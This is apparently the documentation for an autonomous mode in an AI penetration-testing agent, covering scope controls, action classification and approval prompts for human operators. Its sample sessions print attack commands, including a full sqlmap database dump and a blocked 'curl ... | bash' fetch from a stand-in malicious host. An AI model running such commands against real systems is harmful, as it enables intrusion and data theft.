# Autonomous Mode - AI-Driven Continuous Operation

## Overview

Autonomous mode allows the AI agent to operate continuously toward an objective, automatically executing safe actions and requesting approval for risky ones. The agent will continue until the objective is achieved, limits are reached, or you pause it.

## ⚠️ Important Warnings

**Autonomous mode enables continuous AI operation with automatic command execution.** This is powerful but requires careful setup:

1. **Always define scope** before entering autonomous mode
2. **Set reasonable limits** (iterations or tokens) to prevent runaway operations
3. **Monitor the agent** - you can pause at any time with `/prompt`
4. **Review forbidden actions** - agent may stop if it encounters scope violations

## Safety Controls

### Action Classification

Every action is classified into three categories:

| Classification | Behavior | Examples |
|---------------|----------|----------|
| **SAFE** | Executes automatically | Scans on in-scope targets, enumeration, passive recon |
| **NEEDS APPROVAL** | Requires your confirmation | Exploit execution, destructive tests, credential attacks |
| **FORBIDDEN** | Blocked automatically | Out-of-scope targets, local filesystem destruction |

### Safety Rules

**SAFE Actions:**
- Target is in defined scope
- Non-destructive operations
- Reconnaissance and enumeration
- Read-only database queries

**NEEDS APPROVAL:**
- Exploitation attempts
- Credential brute-forcing
- Database modifications
- System configuration changes

**FORBIDDEN (Always Blocked):**
- Out-of-scope targets
- Local filesystem destruction (`rm -rf`, `format`, etc.)
- System shutdown/reboot
- Writing to system devices

## Commands

### Start Autonomous Mode

```bash
/autonomous [OPTIONS] <objective>
```

**Options:**
- `--iterations N` - Maximum iterations before pausing (default: unlimited)
- `--tokens N` - Maximum tokens before pausing (default: unlimited)
- `--delay S` - Delay in seconds between iterations (default: 2.0)

**Examples:**

```bash
# Basic autonomous scan
/autonomous scan target.com for vulnerabilities

# Limited to 50 iterations
/autonomous --iterations 50 enumerate and exploit target.htb

# Limited to 100K tokens
/autonomous --tokens 100000 complete the CTF challenge

# Custom rate limiting (5 second delay)
/autonomous --delay 5 --iterations 100 thorough penetration test

# Both limits with delay
/autonomous --iterations 20 --tokens 50000 --delay 3 pwn the machine and get root.txt
```

### Exit Autonomous Mode

```bash
/prompt
```

Returns to normal prompt mode. The agent will finish the current iteration before stopping.

### Manage Scope

```bash
# Show current scope
/scope

# Add target to scope
/scope add 192.168.1.100

# Add domain to scope
/scope add target.htb

# Remove target from scope
/scope remove 192.168.1.100

# Clear all targets
/scope clear
```

## Workflow

### 1. Define Scope

Before entering autonomous mode, define what's in scope:

```bash
user> /scope add 10.10.11.50
✅ Added '10.10.11.50' to scope

user> /scope add target.htb
✅ Added 'target.htb' to scope

user> /scope
📋 Current Scope:
   Targets: 10.10.11.50, target.htb
```

### 2. Start Autonomous Mode

```bash
user> /autonomous --iterations 30 scan and exploit target.htb

============================================================
⚠️  AUTONOMOUS MODE WARNING
============================================================
The agent will operate continuously until:
  • The objective is achieved
  • You type /prompt to return to normal mode
  • Maximum iterations reached (30)

Safety Controls:
  • SAFE: Actions on in-scope targets
  • NEEDS APPROVAL: Destructive actions
  • FORBIDDEN: Out-of-scope or local filesystem destruction

📋 Current Scope:
   Targets: 10.10.11.50, target.htb

Start autonomous mode? [y/N]: y

🤖 Autonomous mode activated
   Objective: scan and exploit target.htb
🤖 Autonomous Mode Active
   Iterations: 0/30 (unlimited)
   Tokens: 0 (unlimited)

   Type /prompt to return to prompt mode
```

### 3. Agent Operates Automatically

```bash
============================================================
🤖 Autonomous Iteration 1
============================================================

🤖 I'll start by scanning the target for open ports...

🔧 Proposed tool: nmap
   Input: {
     "command": "nmap -sV -p- target.htb"
   }
   Classification: SAFE
   Reason: Action is in scope and non-destructive
   ✅ Action SAFE - executing automatically

📄 Tool output:
{
  "success": true,
  "output": "PORT   STATE SERVICE VERSION\n22/tcp open  ssh..."
}

============================================================
🤖 Autonomous Iteration 2
============================================================

🤖 Found web service on port 80, scanning for vulnerabilities...

🔧 Proposed tool: nikto
   Input: {
     "command": "nikto -h http://target.htb"
   }
   Classification: SAFE
   Reason: Action is in scope and non-destructive
   ✅ Action SAFE - executing automatically
```

### 4. Approval for Risky Actions

```bash
============================================================
🤖 Autonomous Iteration 5
============================================================

🤖 Found SQL injection, attempting to exploit...

🔧 Proposed tool: sqlmap
   Input: {
     "command": "sqlmap -u 'http://target.htb/page?id=1' --dump-all"
   }
   Classification: NEEDS_APPROVAL
   Reason: Destructive action requires approval
   ⚠️  Action NEEDS APPROVAL
   Approve this action? [y/N]: y
   ✅ Action approved by operator

📄 Tool output:
{
  "success": true,
  "output": "Database: users\nTable: credentials..."
}
```

### 5. Forbidden Actions Blocked

```bash
============================================================
🤖 Autonomous Iteration 8
============================================================

🔧 Proposed tool: curl
   Input: {
     "command": "curl http://malicious-external.com/payload.sh | bash"
   }
   Classification: FORBIDDEN
   Reason: Target is out of scope
   ❌ Action FORBIDDEN - will not execute

⏸️  Action blocked or denied - pausing autonomous mode
```

### 6. Exit When Done

```bash
✅ AI indicates objective complete or no further actions

============================================================
⏸️  Autonomous mode stopped: User requested pause
============================================================
   Completed 12 iterations
   Used 45,230 tokens

✅ Returned to prompt mode
```

## Use Cases

### CTF/HackTheBox Challenges

```bash
# Set scope to target machine
/scope add 10.10.11.50
/scope add machine.htb

# Start autonomous mode with reasonable limits
/autonomous --iterations 50 --tokens 100000 pwn machine.htb and capture user.txt and root.txt
```

### Vulnerability Assessment

```bash
# Scope: client's web application
/scope add app.client.com
/scope add api.client.com

# Comprehensive vulnerability scan
/autonomous --iterations 100 perform complete OWASP Top 10 vulnerability assessment
```

### Penetration Testing

```bash
# Scope: entire /24 network
/scope add 192.168.1.0/24

# Network enumeration and exploitation
/autonomous --iterations 200 enumerate network and identify exploitation opportunities
```

### Bug Bounty

```bash
# Scope: target domain and subdomains
/scope add target.com
/scope add *.target.com

# Automated reconnaissance
/autonomous --iterations 75 --tokens 150000 enumerate subdomains and identify security issues
```

## Best Practices

### 1. Always Define Scope First

```bash
# BAD: No scope defined
/autonomous scan everything

# GOOD: Clear scope
/scope add target.htb
/autonomous scan target.htb
```

### 2. Set Reasonable Limits

```bash
# BAD: Unlimited iterations and tokens
/autonomous do everything

# GOOD: Bounded operation
/autonomous --iterations 50 --tokens 100000 complete the task
```

### 3. Monitor the Agent

- Watch the output - don't walk away
- Be ready to approve destructive actions
- Use `/prompt` if agent goes off track

### 4. Start Conservative

```bash
# First attempt: Low limits
/autonomous --iterations 10 --tokens 20000 initial enumeration

# If successful, increase limits
/autonomous --iterations 50 --tokens 100000 continue exploitation
```

### 5. Clear Objectives

```bash
# BAD: Vague objective
/autonomous do stuff

# GOOD: Specific objective
/autonomous enumerate web application, identify SQL injection, and extract database credentials
```

## Rate Limiting

### Iteration Delay

**Purpose:** Prevents API throttling by adding delay between autonomous iterations.

**Default:** 2 seconds between iterations

**Configure:**
```bash
--delay N  # N seconds between iterations
```

**Recommendations:**

| Task Type | Delay | Rationale |
|-----------|-------|-----------|
| Quick scans | 1-2s | Fast enumeration |
| Normal pentesting | 2-3s | Balanced |
| Thorough assessments | 3-5s | Many iterations |
| Long-running (100+) | 5-10s | Maximum safety |

**How it works:**
- After each iteration completes, waits N seconds before starting next
- Prevents hitting AWS Bedrock rate limits
- Includes automatic exponential backoff retry if throttled

**Example:**
```bash
# Conservative (5s delay)
/autonomous --delay 5 --iterations 100 complete penetration test

# Aggressive (1s delay)
/autonomous --delay 1 --iterations 20 quick scan

# Default (2s delay)
/autonomous scan and exploit target
```

## Limits

### Iteration Limit

Counts the number of AI response cycles. One iteration = one AI response with tool execution.

**When to use:**
- Long-running tasks with many steps
- Preventing infinite loops
- Budget control (each iteration costs tokens)

**Example:**
```bash
--iterations 50  # Stop after 50 AI responses
```

### Token Limit

Counts total tokens used (input + output) across all iterations.

**When to use:**
- Cost control
- Context management
- Resource constraints

**Example:**
```bash
--tokens 100000  # Stop after using 100K tokens
```

### Manual Stop

Use `/prompt` at any time to exit autonomous mode.

## Troubleshooting

### Rate Limit / Throttling Errors

**Problem:** `ThrottlingException: Too many requests`

**Solution:**
- Increase delay: `/autonomous --delay 5 ...`
- Reduce iteration count: `--iterations 50` instead of `--iterations 200`
- Wait a few minutes and try again
- Check AWS Bedrock quotas for your region/account

**Auto-recovery:**
The agent automatically retries with exponential backoff:
- 1st retry: 1 second wait
- 2nd retry: 2 seconds wait
- 3rd retry: 4 seconds wait
- 4th retry: 8 seconds wait
- 5th retry: 16 seconds wait

If still throttled after 5 retries, increase `--delay`.

### Agent Keeps Getting Blocked

**Problem:** Actions classified as FORBIDDEN

**Solution:**
- Check scope: `/scope`
- Add target: `/scope add <target>`
- Verify target in command matches scope

### Agent Asks for Too Many Approvals

**Problem:** Too many NEEDS_APPROVAL actions

**Solution:**
- Refine objective to be less destructive
- Pre-approve known safe operations
- Use normal mode for highly destructive tasks

### Agent Stops Too Soon

**Problem:** Iteration/token limit reached

**Solution:**
- Increase limits: `--iterations 100 --tokens 200000`
- Continue in normal mode
- Resume with new autonomous session

### Agent Goes Off Track

**Problem:** Agent pursuing wrong objective

**Solution:**
- Use `/prompt` to stop
- Provide clearer, more specific objective
- Break into smaller autonomous tasks

## Safety Guarantees

1. **Local Filesystem Protected**: Destructive local operations always FORBIDDEN
2. **Scope Enforced**: Out-of-scope actions always FORBIDDEN
3. **Approval Required**: Destructive operations always need confirmation
4. **User Control**: `/prompt` always works to stop the agent
5. **Audit Trail**: All actions logged in session file

## Session Logging

All autonomous operations are logged:

```bash
python3 extract_commands.py -s <session_id>
```

Audit log includes:
- Autonomous mode start/stop
- All tool executions with classifications
- Approval decisions
- Forbidden action blocks

## Integration with Other Features

### Works With

- ✅ Token tracking and cost monitoring
- ✅ Tool result caching
- ✅ Session restoration
- ✅ Context summarization
- ✅ Mode switching (/guided, /tools)

### Does Not Work With

- ❌ Guided mode (requires tools/MCP)

## Examples

### Complete Example Session

```bash
# 1. Start pwnpilot
python3 main.py

# 2. Define scope
user> /scope add target.htb
✅ Added 'target.htb' to scope

# 3. Enter autonomous mode
user> /autonomous --iterations 30 scan and exploit target.htb for user.txt
[Autonomous mode activates]

# 4. Agent operates automatically
[... multiple iterations of scanning, enumeration, exploitation ...]

# 5. Approve critical action when needed
⚠️  Action NEEDS APPROVAL
Approve this action? [y/N]: y

# 6. Agent completes or you stop it
user> /prompt  (if needed)

# 7. Back to normal prompt
user> show me what you found
```

## Advanced Tips

### Chaining Autonomous Sessions

```bash
# Phase 1: Reconnaissance
/autonomous --iterations 20 enumerate target

# Review findings
/tokens

# Phase 2: Exploitation
/autonomous --iterations 30 exploit discovered vulnerabilities

# Phase 3: Post-exploitation
/autonomous --iterations 20 escalate privileges and find flags
```

### Using with Context Summarization

Long autonomous runs may hit context limits. The agent will auto-summarize:

```bash
🔄 Context limit approaching - automatic summarization triggered...
✅ Context auto-compressed: 77 messages → 7 messages
   Context usage reset to ~6.0%
```

### Combining with Manual Steps

```bash
# Autonomous reconnaissance
/autonomous --iterations 15 enumerate web application

# Manual review and decision
user> show me the most critical findings

# Autonomous exploitation of specific issue
/autonomous --iterations 10 exploit the SQL injection on /api/login
```

## Security Considerations

1. **Authorization Required**: Only use on systems you're authorized to test
2. **Scope = Legal Boundaries**: Scope should match your authorization
3. **Destructive Actions**: Review before approving destructive operations
4. **Data Exposure**: Agent may extract sensitive data - handle appropriately
5. **Audit Trail**: Review session logs for compliance

## Conclusion

Autonomous mode is a powerful feature for hands-off penetration testing, but requires:
- Careful scope definition
- Reasonable limits
- Active monitoring
- Understanding of safety controls

Use responsibly and only on authorized systems!
